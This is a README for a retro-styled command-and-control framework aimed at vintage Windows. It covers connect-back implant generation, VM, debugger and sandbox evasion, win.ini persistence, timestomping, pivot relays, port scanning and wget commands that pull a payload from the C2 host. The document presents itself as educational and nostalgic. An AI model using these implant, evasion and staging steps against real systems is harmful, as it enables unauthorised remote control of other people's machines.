# ÆldreC2 - C2 for the masses

> "Shall we play a game?"

## Quick Start

```bat
rem 1. Build the tools
build-c2.sh

rem 2. Start the controller on your operator box
joshua.exe
rem   Joshua immediately listens on :4444
rem   Session list panel on the left shows connected implants

rem 3. Scan the target network
grid 169.254.69.0/24 -p 22,80,443,3389,445 -b
rem   Open ports printed as they are found; redirect for parsing:
grid -q 169.254.69.0/24 -p 1-1024 > results.txt

rem 4. Generate a customised implant
clu.exe
rem   GUI: browse to tank.exe as template, set C2 host/port, click Generate

rem 5. Run the implant on the target — it calls home to Joshua
rem   Joshua shows a new MDI child: "Tank: hostname  OS [ready]"
rem   Tank menu: Sysinfo / Process List / Get File / Put File / Screenshot
```

ÆldreC2 is an experimental Command & Control framework targeting vintage Microsoft Windows environments, with a primary focus on Windows 3.1x and Win32s compatibility.

The project explores what a reasonably capable remote administration framework might have looked like if developed during the early-to-mid 1990s, while taking advantage of modern cryptography and contemporary development practices where practical.

**Repository name:** `aeldreC2`
**Project name:** `ÆldreC2`

---

## Project Goals

* Support Windows 3.1 and Windows for Workgroups 3.11
* Support Win32s applications where available
* Provide secure communications over modern networks
* Remain faithful to the user interface and design conventions of the early 1990s
* Be educational, nostalgic, and technically interesting

---

## Architecture

### Joshua

The central C2 server.

Named after the WOPR computer in the film *WarGames*.

Joshua is responsible for:

* Session management
* Operator authentication
* Task distribution
* Implant management
* TLS session handling
* Logging and audit records

---

### Tank Programs

Remote implants.

Named after the Tank Programs from *Tron*.

Tank Programs provide:

* Remote command execution
* File transfer
* Host information gathering
* Registry interaction
* Process inspection
* Network diagnostics

---

### Lightman

CLI operator client.

Named after David Lightman from *WarGames*.

Connects to a running Joshua instance using the server key. Runs in a GUI window compatible with Win32s / NT 3.1+. Planned Linux support in a future release.

---

### Flynn

GUI operator client with the same feature parity as Lightman.

Named after Kevin Flynn from *Tron*.

Two-pane layout (operator list + log). Connection settings entered via dialog on startup; host/port/key can also be pre-filled from the command line.

---

### CLU

The implant generator.

Named after the Codified Likeness Utility from *Tron*.

Responsibilities:

* Generate customised implants
* Configure callback parameters
* Configure encryption settings
* Produce Win16 and Win32s builds
* Generate deployment packages

---

### Recognizer

Host environment validation and anti-analysis module.

Named after the Recognizers from *Tron*.

Capabilities may include:

* Virtual machine detection
* Debugger detection
* Sandbox detection
* Timing checks
* Environment validation

---

## Features

### Core

* Multi-session control
* Session grouping
* Session tagging
* Session notes
* Operator console
* Event logging
* Audit trail

### Networking

* Native Winsock support
* TCP communications
* Proxy support
* DNS resolution
* Reconnect handling
* Multi-homed network support

### Security

* TLS/SSL support
* Certificate validation
* Encrypted communications
* Secure session negotiation

TLS functionality is provided by the PuTTY-Win32 project.

### User Interface

* Multiple Document Interface (MDI)
* Multiple session windows
* Session manager
* Event viewer
* Transfer manager
* Host information windows
* Configuration editor
* Context-sensitive help

The very best 1993 had to offer.

### Themes

Theme support is planned.

As the Hackers Reference Manual famously states:

> They're trashing our rights.

Naturally this requires configurable colour schemes.

---

## Supported Platforms

### Controller

* Windows 3.1
* Windows for Workgroups 3.11
* Win32s
* Windows NT 3.x
* Windows 95 (best effort)

### Tank Programs

* Windows 3.1
* Windows for Workgroups 3.11
* Win32s
* Windows 95
* Windows NT

---

## Platform Distribution

### Why per-platform binaries are required

This is a hard technical constraint, not a design choice. A single `.exe` cannot transparently run as a native application on all four target environments. Here is exactly why.

**The executable format boundary is absolute.**

Windows selects the application model from the file header before any code runs:

| Header signature | Loader | Environment |
|---|---|---|
| `MZ` → `NE` extension | Win16 kernel (`KRNL386.EXE`) | WFW 3.11, Windows 3.1 |
| `MZ` → `PE` extension | Win32 / Win32s loader | Win32s, Win95, NT |

A file is either NE or PE. There is no "both". A PE file presented to bare WFW 3.11 without Win32s is seen as an MZ DOS program; the loader runs the 16-bit DOS stub at the front of the file and exits. That stub executes in real-mode DOS (a VDM), not as a Win16 application — it has no `CreateWindow`, no message loop, no WFW integration whatsoever. The custom DOS stub described below makes the best of this: it prints a clear error and exits. It cannot become a functional Win16 application.

**Win32s rejects console-subsystem PE executables at the loader.**

Win32s adds Win32 support to WFW 3.11, but it implements only the `SUBSYSTEM_WINDOWS` (GUI) PE loader. `SUBSYSTEM_CONSOLE` binaries are rejected before `WinMain` is reached — the Win32s thunk layer checks the PE optional header subsystem field and refuses to load anything that requires a console subsystem, because Win32s provides none. This is why tools compiled with `-l=nt` (console) display "Windows NT console app" and fail under Win32s, while tools compiled with `-l=nt_win` (GUI) run correctly.

**NT-only tools require NT subsystems that do not exist on WFW.**

Tools such as `svcany`, `whoami`, and `regcli` do not fail on WFW purely due to binary format. Even if the format issue were somehow resolved, they would have nothing to call: the NT Service Control Manager, the Local Security Authority, and the NT registry security model are NT kernel components that are absent from WFW 3.11 entirely. There is no meaningful Win16 equivalent to provide.

**The "fat binary" is not a viable escape hatch.**

The only way to embed multiple execution paths in one file is via the DOS stub — the 64-byte real-mode preamble present in every MZ/NE/PE file. A custom stub can contain arbitrary 16-bit real-mode code, but that code runs in a DOS VDM box: it cannot load as a proper Win16 NE application. Some software ships a Win16 *launcher* (an NE file) that detects Win32s via `GetWinFlags()` and `WinExec`s a companion PE when Win32s is present, but this requires two physical files on disk. It is a deployment convenience, not a universal binary.

**This is standard C2 practice.**

Every major contemporary C2 framework generates per-platform payloads. Metasploit `msfvenom` distinguishes `windows/x86`, `windows/x64`, and `windows/mipsle` as separate targets. Sliver, Havoc, and Cobalt Strike all generate per-OS/per-architecture implants from their respective generators. ÆldreC2 follows the same model, with CLU as the deployment tool: the operator selects the correct template binary for the target node's OS before patching it with the callback address. The target platform is a known property of the node being compromised; choosing the wrong binary is no different from choosing the wrong architecture on a modern C2.

---

### Output folder structure

```
output/
  wfw/      Win16 NE executables — WFW 3.11 and Windows 3.1
               Compiler: wcc -ml -bt=windows -I/opt/watcom/h/win
               Runs on: bare WFW 3.11 (no Win32s required), Windows 3.1
               Cannot run on: Win32s, Win95, NT (wrong executable format)

  win32s/   Win32 GUI-subsystem PE — broadest Win32 compatibility
               Compiler: wcl386 -bt=nt -l=nt_win
               Runs on: Win32s + WFW 3.11, Windows 95, NT 3.1 / 3.51 / 4
               Cannot run on: bare WFW 3.11 without Win32s

  nt/       Win32 NT console + advanced-API PE
               Compiler: wcl386 -bt=nt -l=nt (console) or -l=nt_win (GUI)
               Runs on: NT 3.1+, Windows 95
               Cannot run on: Win32s or bare WFW (console subsystem absent)
```

All C source files maintain parity across these targets. Any feature added to one platform build must be considered for all others where the underlying API permits it.

### Binary placement by platform

| Binary | wfw/ | win32s/ | nt/ |
|--------|:----:|:-------:|:---:|
| `joshua.exe` | — | ✓ | ✓ |
| `tank.exe` | — | ✓ | ✓ |
| `tank16.exe` | ✓ | — | — |
| `clu.exe` | — | ✓ | ✓ |
| `lightman.exe` | — | — | ✓ |
| `lman16.exe` | ✓ | — | — |
| `nc16.exe` | ✓ | — | — |
| `grid16.exe` | ✓ | — | — |
| `grid32.exe` | — | — | ✓ |
| `gridnt.exe` | — | — | ✓ |
| `flynn.exe` | — | ✓ | ✓ |
| `ncwfw.exe` | — | ✓ | ✓ |
| `grid.exe` | — | ✓ | ✓ |
| `gridcli.exe` | — | — | ✓ |
| `ncnt.exe` | — | — | ✓ |
| `ncnt16.exe` | ✓ | — | — |
| `netstatN.exe` | — | — | ✓ |
| `net-stat.exe` | — | ✓ | — |
| `net_stat.exe` | ✓ | — | — |
| `route.exe` | — | — | ✓ |
| `route16.exe` | ✓ | — | — |
| `svcany.exe` | — | — | ✓ (NT SCM required) |
| `regcli.exe` | — | — | ✓ (NT registry security required) |
| `whoami.exe` | — | — | ✓ (NT LSA required) |
| `arp.exe` | — | — | ✓ |
| `stager.exe` | — | — | ✓ |
| `clip.exe` | — | ✓ | ✓ |
| `clip16.exe` | ✓ | — | — |
| `timestmp.exe` | — | — | ✓ |
| `wget.exe` | — | ✓ | ✓ |
| `wget16.exe` | ✓ | — | — |
| `ipcalc32.exe` | — | ✓ | ✓ |
| `ipcalc16.exe` | ✓ | — | — |
| `markuped.exe` | — | ✓ | ✓ |
| `yori16.exe` | ✓ | — | — |
| `yori32.exe` | — | ✓ | ✓ |
| `yoriview.exe` | — | — | ✓ |
| `dumont.exe` | — | — | ✓ |
| `jloshtog.exe` | — | ✓ | ✓ |
| `setup16.exe` | ✓ | — | — |
| `setup32.exe` | — | ✓ | ✓ |

Tools in `nt/` — `svcany`, `regcli`, `whoami`, `lightman`, and the other console-subsystem binaries — carry a custom 16-bit DOS stub that prints `Requires Windows NT 3.1 or later` when run under COMMAND.COM on WFW/Win32s, replacing the default cryptic `This program cannot be run in DOS mode`.

---

## Planned Capabilities

### Remote Administration

* Remote command execution ✓ (`shell`, arbitrary passthrough)
* Remote shell ✓ (`shell` command)
* Environment variable viewing ✓ (`env`)
* System information collection ✓ (`sysinfo`)
* User information collection ✓ (`smb users`, `sysinfo`)

### Process Management

* Process listing ✓ (`ps`)
* Process termination ✓ (`kill <pid>`)
* Process information ✓ (`pinfo <pid>`)
* Task monitoring ✓ (`tasklist` — enhanced process list with full exe paths)

### File Operations

* File upload ✓ (`put`)
* File download ✓ (`get`)
* Directory browsing ✓ (`ls`)
* File deletion ✓ (`del`)
* File renaming ✓ (`ren`)
* File search ✓ (`find [root] <pattern>` — recursive)
* Directory creation ✓ (`mkdir`)
* File copy on target ✓ (`cp`)
* File attribute change ✓ (`attrib [+/-RSHA] <path>` — display or set read-only/hidden/system/archive)

### Registry Operations

* Registry viewing ✓ (`regq`)
* Registry searching ✓ (`regs <key> <term>` — recursive string search)
* Registry export ✓ (`regx <key>` — recursive .reg-format dump)
* Registry editing ✓ (`rege <key> <name> <data>` — set REG_SZ value)

### Networking

* Connection enumeration ✓ (`netstat` — NT4+ / Win98+)
* Route table viewing ✓ (`route` — NT4+ / Win98+)
* Hostname resolution ✓ (`resolve`)
* Interface information ✓ (`ifconfig` — NT4+ / Win98+)
* Remote ping ✓ (`ping` — 4 ICMP echo via `icmp.dll`, reports RTT + TTL; NT 3.5+ / Win95+)
* Basic service discovery ✓ (`scan`)
* Periodic task streaming ✓ (`watch <interval_ms> <cmd>`; `<<<WATCH_TICK>>>` separates iterations; send any input to stop)
* `netstat.exe` renamed to `netstatN.exe` (NT 3.1+); `net-stat.exe` added (Win9x/Win32s GUI); `netstat16.exe` renamed to `net_stat.exe` (WFW 3.11, 8.3-safe)

### Monitoring

* Event logging — not yet implemented (Joshua)
* Session timeline — not yet implemented (Joshua)
* Connection statistics ✓ (bytes rx/tx and command count per session, shown in tank title bar)
* Host inventory ✓ (Dumont network mapper)

---

## Design Philosophy

ÆldreC2 is intended to feel like software that could plausibly have been demonstrated at COMDEX in 1994.

This means:

* Native Windows UI
* Menus instead of ribbons
* Dialog boxes instead of web interfaces
* MDI everywhere
* Keyboard shortcuts for everything
* Minimal dependencies
* Maximum nostalgia

---

## Tools

Binaries are built into `windows/` (working directory) and distributed into `output/wfw/`, `output/win32s/`, and `output/nt/` by platform (see Platform Distribution). Build all at once with `./build-c2.sh`, or individual tools by name.

| Binary | Platform | Role |
|--------|----------|------|
| `joshua.exe` | Win32s / NT / 95 | C2 controller (MDI GUI) |
| `tank.exe` | Win32s / NT / 95 | Implant — connect-back agent |
| `tank16.exe` | Win 3.1 / WFW 3.11 | Implant — 16-bit connect-back agent |
| `clu.exe` | Win32s / NT / 95 | Implant generator / binary patcher |
| `lightman.exe` | Win32 / NT 3.1+ | CLI operator client — pure console, runs in cmd.exe |
| `lman16.exe` | Win 3.1 / WFW 3.11 | CLI operator client — runs from COMMAND.COM DOS Prompt |
| `nc16.exe` | Win 3.1 / WFW 3.11 | Netcat pivot tool — connect-out or listen, raw relay |
| `grid16.exe` | Win 3.1 / WFW 3.11 | TCP port scanner — COMMAND.COM console, operator or tank-driven |
| `grid32.exe` | Win32 / NT 3.1+ | TCP port scanner — Win95/NT console, deployable on target |
| `gridnt.exe` | Win32 / NT 3.1+ | TCP port scanner — NT operator scanner, coloured output |
| `flynn.exe` | Win32s / NT / 95 | GUI operator client (connects to Joshua) |
| `ncwfw.exe` | Win32s / NT / 95 | Netcat-style TCP relay |
| `grid.exe` | Win32s / NT / 95 | TCP port scanner (GUI / auto-detect) |
| `gridcli.exe` | Win32 / NT 3.1+ | TCP port scanner (pure console, NT `cmd.exe` only — use `grid.exe` on WFW) |
| `ncnt.exe` | Win32 / NT 3.1+ | Netcat for NT — inspired by Weld Pond (L0pht, ~1998) |
| `svcany.exe` | Win32 / NT 3.1+ | Install/remove/start/stop any executable as an NT service |
| `regcli.exe` | Win32 / NT 3.1+ | CLI registry tool for NT 3.x/4.x (fills gap before reg.exe) |
| `whoami.exe` | Win32 / NT 3.1+ | whoami for NT 3.x (username, domain, SID, groups, privs) |
| `netstatN.exe` | Win32 / NT 3.1+ | Active TCP/UDP connections. NT4+: iphlpapi native; NT 3.x: exec fallback |
| `net-stat.exe` | Win9x / Win32s | Active connections — GUI dialog; iphlpapi or COMMAND.COM fallback |
| `net_stat.exe` | Win 3.1 / WFW 3.11 | Active connections via COMMAND.COM capture in a GUI dialog |
| `route.exe` | Win32 / NT 3.1+ | Display/add/delete IP routes. NT4+: iphlpapi; NT 3.x: exec + registry |
| `route16.exe` | Win 3.1 / WFW 3.11 | Routing table via COMMAND.COM capture in a GUI dialog |
| `arp.exe` | Win32 / NT 4+ | ARP table viewer + ICMP ping sweep |
| `stager.exe` | Win32 / NT 3.1+ | Tiny HTTP file server — serve a file once then exit |
| `clip.exe` | Win32 / NT 3.1+ | Clipboard read/write from command line |
| `clip16.exe` | Win 3.1 / WFW 3.11 | Clipboard read/write for Win16 — displays content in MessageBox; saves to file or writes from command-line arg |
| `timestmp.exe` | Win32 / NT 3.1+ | File timestamp copy and set — 8.3: timestmp (authorised forensic testing) |
| `yori16.exe` | Win 3.1 / WFW 3.11 | Remote screen server — runs **on target**; listens on TCP 5353 |
| `yori32.exe` | Win32s / Win95 / NT 3.1+ | Remote screen server — runs **on target**; listens on TCP 5353 |
| `yoriview.exe` | Win32 / NT 4+ | Remote screen viewer — runs **on operator box**; connect to target IP:5353 |
| `ipcalc32.exe` | Win32s / NT / 95 | Subnet calculator |
| `ipcalc16.exe` | Win 3.1 / WFW 3.11 | Subnet calculator (16-bit) |
| `markuped.exe` | Win32s / NT / 95 | Markdown editor (split-pane, live preview) |
| `wget.exe` | Win32s / NT / 95 | Command-line HTTP/HTTPS/FTP downloader |
| `wget16.exe` | Win 3.1 / WFW 3.11 | Command-line HTTP downloader (16-bit) |
| `jloshtog.exe` | Win32s / NT / 95 | Joshua log viewer — reads `joshua.log` outwith the controller |
| `dumont.exe` | Win32 / NT 3.1+ | Network mapper — renders grid scan output as a node map |

> All examples below use `example.com` as the target host, `169.254.69.0/24` as the target LAN, and `172.16.93.0/16` as the C2 infrastructure range. Neither subnet is internet-routable.

---

### joshua.exe — C2 Controller

```bat
rem Start the controller; it listens immediately on TCP 4444
joshua.exe
```

On startup, Joshua generates an 8-digit hex **server key** and prints it in the Server Log window:

```
===== AeldreC2 Joshua =====
Server key : A3F7B291
Connect with:
  lightman.exe <your-ip> 4444 A3F7B291
  flynn.exe    <your-ip> 4444 A3F7B291
===========================
```

Sessions (tanks + operator clients) appear in the left panel. Each session opens as an MDI child window. Use the Tank menu to issue tasks: Sysinfo, Process List, Directory Listing, Get File, Put File, Screenshot, Subnet Scan, Run Script, Packet View.

**Operator / moderator commands** — type in the Server Log console or send from an operator client:

| Command | Who | Effect |
|---------|-----|--------|
| `/givemod <handle>` | console (always) or mod | Promote operator to moderator |
| `/removemod <handle>` | console or mod | Demote moderator (last mod protected) |
| `/ops` | any | List connected operators |
| `/tanks` | any | List connected implants |
| `/kick <handle>` | console or mod | Disconnect an operator |
| `/key` | console only | Re-display the server key |
| `/scansubnet <cidr> [-p ports]` | console or mod | Run `scan` on active tank; results open in Dumont |
| `/script <file>` | console or mod | Run a script file on the active tank |

**Tab completion** — press `Tab` in any session input field to cycle through known commands. Works for both tank commands and `/` console commands.

**Themes** — `View → Theme` selects from 21 colour themes (Solarized Dark, Matrix, Teletext, ProComm, British Rail, DSB, ScotRail, Pan Am, IRN-BRU, and more). Selection is persisted to `WIN.INI` and survives restart.

**Session scripting** — `Tank → Run Script...` loads a `.mac` or `.txt` file and sends each command to the tank in sequence, waiting for `<<<DONE>>>` between steps. One command per line; `#` introduces a comment.

**Macro recording** — `Tank → Record Macro` captures every command sent during the session. `Tank → Save Macro...` writes the recording to a file for replay. `Tank → Play Macro...` replays the in-memory recording or loads a saved macro file.

**Packet viewer** — `Tank → Packet View` opens an MDI hex-dump window showing live inbound and outbound traffic for that session (decrypted where TLS is in use).

**Sound events** — system sounds fire on tank connect/disconnect and operator join/leave. Uses `winmm.dll` loaded dynamically; silent on machines without a sound card.

**Easter egg** — press `£` during the startup splash to play the Windows NT 4 startup theme.

---

### lightman.exe — CLI Operator Client

Named after David Lightman from *WarGames*.

```bat
rem  With handle on the command line (no prompt):
lightman.exe 172.16.93.1 4444 A3F7B291 operator

rem  Without handle — prompts in the console or via dialog:
lightman.exe 172.16.93.1 4444 A3F7B291
```

Pure console tool — runs in an NT `cmd.exe` window.  Use `flynn.exe` for a GUI operator client on Win32s/Win95.

Type commands or `/` operator commands at the prompt. Admin commands start with `/`.

---

### flynn.exe — GUI Operator Client

Named after Kevin Flynn from *Tron*.

```bat
flynn.exe
rem  Connection dialog: host, port, key, handle — then connects
rem  Or pre-fill from command line:
flynn.exe 172.16.93.1 4444 A3F7B291
```

Two-pane layout: operator list on the left, log + input on the right.

---

---

### tank.exe / tank16.exe — Implants

```bat
rem Build implants pre-configured for the C2 host
C2HOST=172.16.93.1 C2PORT=4444 ./build-c2.sh tank
C2HOST=172.16.93.1 C2PORT=4444 ./build-c2.sh tank16

rem Or patch an existing binary with CLU (no recompile)
clu.exe
```

**`tank.exe`** — Win32s, Windows NT 3.x, Windows 95 and later.  
**`tank16.exe`** — Windows 3.1 / WFW 3.11. Requires `WINSOCK.DLL` in the path (Trumpet Winsock or equivalent).

Both speak the same protocol; a single Joshua controller handles sessions from either.

---

### clu.exe — Implant Generator

Patches the C2 callback address and port into a built implant without recompiling.

```bat
rem 1. Start joshua.exe — note the Server key printed in the startup log (e.g. A3F7B291)
rem 2. Open clu.exe
rem 3. Browse to tank.exe (or tank16.exe) as template
rem 4. Set C2 host: 172.16.93.1  Port: 4444
rem 5. Paste the Server key from Joshua (e.g. A3F7B291)
rem 6. Optionally tick TLS
rem 7. Browse to output path, click Generate
```

The server key is regenerated each time Joshua starts. Tanks patched with a key from a previous Joshua session will not connect until re-patched. Use `/regenkey` in the Joshua console to rotate the key and re-patch all implants.

---

### ncwfw.exe — TCP Relay

Lightweight netcat for WFW. Optional TLS. Useful for pivoting or testing connectivity.

```bat
rem Connect to a service on the target LAN
ncwfw.exe 169.254.69.10 22

rem Connect to the C2 controller
ncwfw.exe 172.16.93.1 4444

rem Connect to a named host
ncwfw.exe example.com 443
```

---

### grid.exe — Port Scanner

TCP connect scan. Works on Win32s/WFW 3.11 with no threads — async pool via `select()`.

```bat
rem Scan the target LAN for common services
grid.exe 169.254.69.0/24 -p 22,80,443,3389,445 -b

rem Full first-1024 sweep to file (tab-delimited: HOST TAB PORT/tcp TAB open TAB SERVICE TAB BANNER)
grid.exe -q 169.254.69.0/24 -p 1-1024 > results.txt

rem Scan by DNS name
grid.exe example.com -p 80,443,8080,8443 -b

rem Verify C2 listeners are responding
grid.exe 172.16.93.1 -p 443,4444,8443 -b

rem Address range notation
grid.exe 169.254.69.1-254 -p 445
```

See [Grid — Port Scanner](#grid--port-scanner) below for the full option reference.

---

### ipcalc32.exe / ipcalc16.exe — Subnet Calculator

Calculates network, broadcast, host range, class, and RFC flags for a CIDR block or IP+mask.

```bat
rem Target LAN
ipcalc32.exe 169.254.69.0/24

rem C2 infra block
ipcalc32.exe 172.16.93.0/16

rem Host route
ipcalc32.exe 172.16.93.1/32

rem Specify by dotted mask
ipcalc32.exe 169.254.69.0 255.255.255.0

rem Write results to file (-o, scriptable)
ipcalc32.exe -o C:\TEMP\NETPLAN.TXT 169.254.69.0/24

rem Example output (169.254.69.0/24):
rem   Address:   169.254.69.0
rem   Netmask:   255.255.255.0 = 24
rem   Network:   169.254.69.0/24
rem   Broadcast: 169.254.69.255
rem   HostMin:   169.254.69.1
rem   HostMax:   169.254.69.254
rem   Hosts/Net: 254
rem   APIPA / link-local (RFC 3927)
```

`ipcalc16.exe` is the Win16 build of the same source — identical arguments and output, runs on Windows 3.1 / WFW 3.11.

---

### markuped.exe — Markdown Editor

Split-pane Markdown editor with live preview. Left pane is the raw source; right pane renders headers, bold/italic, inline code, fenced code blocks, blockquotes, lists, horizontal rules, and hyperlinks. A draggable splitter adjusts the pane ratio. Preview updates 500 ms after each keystroke.

```bat
rem Open the editor (blank document)
markuped.exe

rem Open a specific file directly
markuped.exe C:\NOTES\REPORT.MD
```

**Toolbar / keyboard shortcuts:**

| Button | Action | Shortcut |
|--------|--------|---------|
| New | New document | Ctrl+N |
| Open | Open .md / .txt | Ctrl+O |
| Save | Save | Ctrl+S |
| B | Wrap selection in `**bold**` | Ctrl+B |
| I | Wrap selection in `*italic*` | Ctrl+I |
| H1 / H2 / H3 | Prefix current line with `#` / `##` / `###` | — |
| `` ` `` | Wrap selection in `` `code` `` | — |
| ` ``` ` | Insert fenced code block | — |
| > | Prefix current line with `> ` (blockquote) | — |
| --- | Insert horizontal rule | — |
| - | Prefix current line with `- ` (list item) | — |
| — | Toggle preview pane | Ctrl+P |

All Format operations are also in the Format menu. File operations in the File menu. Edit menu provides Undo/Cut/Copy/Paste/Select All.

---

### wget.exe / wget16.exe — File Downloader

Command-line HTTP/HTTPS/FTP downloader. When launched from `cmd.exe` or `command.com`, progress is written to stderr. When launched from Program Manager, a small GUI window shows URL, filename, progress bar, and a Stop button.

```bat
rem Download a file over HTTP
wget.exe http://example.com/files/tools.zip

rem Download and save with a specific name
wget.exe http://172.16.93.1/payloads/agent.bin -O C:\TEMP\AGENT.BIN

rem Download over HTTPS (requires WININET.DLL — IE 3+)
wget.exe https://example.com/report.pdf -O REPORT.PDF

rem Quiet mode — no progress output
wget.exe http://172.16.93.1/data.dat -O DATA.DAT -q

rem FTP (anonymous login, binary transfer)
wget.exe ftp://172.16.93.1/pub/toolkit.zip
```

`wget16.exe` is the Win16 build. HTTP only — no HTTPS or FTP. Loads `WINSOCK.DLL` dynamically, so it works on any WFW 3.11 / Win 3.1 installation that has a Winsock stack.

```bat
rem Win16 HTTP download
wget16.exe http://172.16.93.1/pkg.zip -O PKG.ZIP
```

**Options:**

| Flag | Description |
|------|-------------|
| `-O <file>` | Output filename (default: derived from URL path) |
| `-q` | Quiet — suppress progress output / GUI window |

---

### jloshtog.exe — Joshua Log Viewer

Named with mild Scots flavour — *losh* being a softened exclamation, *og* meaning log. Reads `joshua.log` outwith the main controller: no sockets, no auth, no MDI.

```bat
rem Open alongside joshua.log (auto-detected in same directory)
jloshtog.exe

rem Open a specific log file
jloshtog.exe C:\LOGS\joshua.log
```

**Features:**

- Locates `joshua.log` in the same directory as `jloshtog.exe` automatically
- `File → Open` to browse, `F5` to reload
- `View → Filter` — All Events / Tanks Only / Operators Only
- `View → Word Wrap` toggle
- Status bar: filename, line count, byte count

---

### dumont.exe — Network Mapper

Named after Dumont, the I/O Tower Guardian in *Tron*. Reads `grid` scan output and renders a scrollable node map.

```bat
rem Load a saved scan file
dumont.exe 169.254.69.0_24.tsv

rem Pipe grid output directly
grid -q 169.254.69.0/24 -p 22,80,443,445,3389 | dumont.exe

rem Or use File > Open after launching
dumont.exe
```

Within Joshua, `/scansubnet` runs a scan via the active tank implant and opens Dumont automatically when the scan completes.

**Features:**

- Node map: each host as a box, open ports listed inside
- Hosts grouped and sorted by /24 subnet
- `View → Zoom` — 50 % to 150 %
- `View → Service Labels` toggle
- `View → Subnet Groups` toggle
- `File → Copy Map to Clipboard` exports plain text
- Scrollable; mouse wheel supported

---

## Grid — Port Scanner

`windows/grid.c` — Win32s/Win32 TCP connect scanner. GUI subsystem, async select-pool, no threads; runs on Win32s and WFW 3.11 through Windows NT 4.

### Quick reference

```
grid <target> -p <ports> [options]

  target    x.x.x.x | x.x.x.x/24 | x.x.x.1-254 | hostname
  -p        80 | 1-1024 | 22,80,443 | 1-100,443,8080
  -t ms     connect timeout (default 500 ms)
  -b        banner grab (reads first line after connect)
  -q        quiet mode — machine-readable, no colour, no progress bar
  -T n      pool size / max concurrent connects (default 64, max 256)
```

When stdout is a terminal, grid draws a progress bar and colour-codes
open ports. When stdout is redirected, output is plain tab-delimited:

```
HOST<TAB>PORT/tcp<TAB>open<TAB>SERVICE<TAB>BANNER
```

Examples:

```bat
rem Scan common ports on the target LAN
grid 169.254.69.0/24 -p 22,80,443,3389,445 -b

rem Pipe parseable results into a file
grid -q 169.254.69.0/24 -p 1-1024 > results.txt

rem Single host, full port range, max pool
grid 172.16.93.1 -p 1-65535 -T 256 -t 200
```

### Data files

Service names are loaded from `SERVICES.DAT` (nmap-services format).
Grid looks for it next to `grid.exe`, or in `%GRIDDATA%\SERVICES.DAT`.

Fetch the nmap GPL data files and rename to 8.3 filenames:

```sh
./fetch-nmap-data.sh        # fetches SERVICES.DAT, PROTOS.DAT, NMAPRPC.DAT, MACPFX.DAT
./fetch-nmap-data.sh -a     # also fetches OSDB.DAT and SVCPRO.DAT (large)
```

Copy `SERVICES.DAT` next to `grid.exe` before use.

| 8.3 name        | Original nmap file       |
|-----------------|--------------------------|
| `SERVICES.DAT`  | `nmap-services`          |
| `PROTOS.DAT`    | `nmap-protocols`         |
| `NMAPRPC.DAT`   | `nmap-rpc`               |
| `MACPFX.DAT`    | `nmap-mac-prefixes`      |
| `OSDB.DAT`      | `nmap-os-db`             |
| `SVCPRO.DAT`    | `nmap-service-probes`    |

nmap data files are GPL-licensed. See https://nmap.org/book/man-legal.html

---

## TODO

### Completed

* ~~Session scripting~~ — `Tank → Run Script...`; `/script <file>` console command
* ~~Macro support~~ — `Tank → Record / Save / Play Macro`
* ~~Integrated packet viewer~~ — `Tank → Packet View`; live hex dump MDI child
* ~~Network mapping~~ — `dumont.exe`; auto-launched after `/scansubnet`
* ~~Historical Windows theme packs~~ — 21 themes, `View → Theme`, persisted to `WIN.INI`
* ~~Sound support for session events~~ — system sounds on tank/operator connect and disconnect
* ~~Offline log analysis~~ — `jloshtog.exe`
* ~~Easter egg~~ — `£` during startup splash plays the Windows NT 4 startup theme
* ~~ADVAPI32 static import~~ — removed from `tank.exe` PE import table; runtime-loaded; tank now starts on Win32s
* ~~Recognizer false-positives~~ — timing loop raised to 2M iterations / ≥2 ticks; "test" and "user" removed from username blacklist
* ~~`regs` / `regx` wrong recursive paths~~ — `regs_recurse` and `regx_recurse` now pass `hbase` + `fullpath` through all levels
* ~~`persist` WFW unquoted path~~ — `self_path` now quoted in `win.ini load=`; remove path strips quotes before comparing
* ~~`netstat16` / `route16` missing Win16 include path~~ — `-I/opt/watcom/h/win` added to Makefile rules
* ~~`mkdir`, `cp`, `attrib`~~ — added to tank.c and Joshua tab completion
* ~~`ping`~~ — added to tank.c; `icmp.dll` runtime load, 4 pings, TTL+RTT
* ~~`clip16.exe`~~ — Win16 WFW clipboard tool; read/write via MessageBox UI
* ~~Connection statistics~~ — `stat_bytes_in/out/cmd_count` in `JoshSession`; shown in tank title bar
* ~~Per-platform output folders~~ — `dist-wfw`, `dist-win32`, `dist-nt`, `dist-all` Makefile targets
* ~~Custom DOS stubs~~ — `ntstub.asm` → `ntstub.exe`; embedded via `option stub=` in 10 NT-only console tools; prints "Requires Windows NT 3.1 or later" instead of default message

### Platform Distribution — Remaining

* **`ncnt16.exe`** — Win16 single-connection netcat for WFW; low priority as `ncwfw.exe` covers most use cases

### Tank (Win32) — Remaining

* ~~**`watch <interval> <cmd>`**~~ — implemented; `watch <ms> <cmd>` repeats a shell command every N ms; `<<<WATCH_TICK>>>` separates iterations; Joshua displays `═══` tick separator and keeps slot open; send any input from operator to stop

### Tank (Win16) — Remaining

* ~~**`screenshot`**~~ — implemented; 24bpp BMP via Win16 GDI (`CreateCompatibleBitmap` / `BitBlt` / `GetDIBits`); row-by-row send to avoid >64KB allocation; packed BITMAPFILEHEADER avoids struct alignment issues

### Joshua — Remaining

* **Event logging** — structured per-session event log (separate from free-text `joshua.log`); fields: timestamp, session ID, event type, detail
* **Session timeline** — MDI child showing cross-session events chronologically, filterable by type

### Infrastructure — Remaining

* **Win3.11 installer** — proper `SETUP.EXE`-style wizard; Program Manager group auto-creation; optional component selection; must run on bare WFW 3.11
* **Plugin architecture** — stable ABI design needed first; deferred
* **WinG visual enhancements** — niche; needs the WinG SDK

---

## Implementation Status

### Implemented

| Component | File | Notes |
|-----------|------|-------|
| **Joshua** | `windows/joshua.c` | MDI C2 controller. Listens on :4444. Session list panel, Tank banner parsing, file receive, put/screenshot, Schannel TLS. 21-theme engine (View → Theme, WIN.INI persistence). Sound events (winmm.dll). Session scripting and macro recording/playback. Packet viewer (live hex dump MDI child). `/scansubnet` → Dumont pipeline. Tab completion. Easter egg (£ → NT4 startup WAV). |
| **Tank (Win32)** | `windows/tank.c` | Connect-back implant, Win32s compatible. Commands: sysinfo, ps, ls, get, put, regq, screenshot, scan, portfwd, socks4, smb, rdp, shell, cat, less, persist, cd, mkdir, cp, attrib, ping, del, ren, find, tasklist, regs, rege, regx, env, kill, pinfo, resolve, ifconfig, netstat, route, watch. Embedded async TCP scanner. Schannel TLS. CLU patchable. ADVAPI32 runtime-loaded (Win32s compatible). |
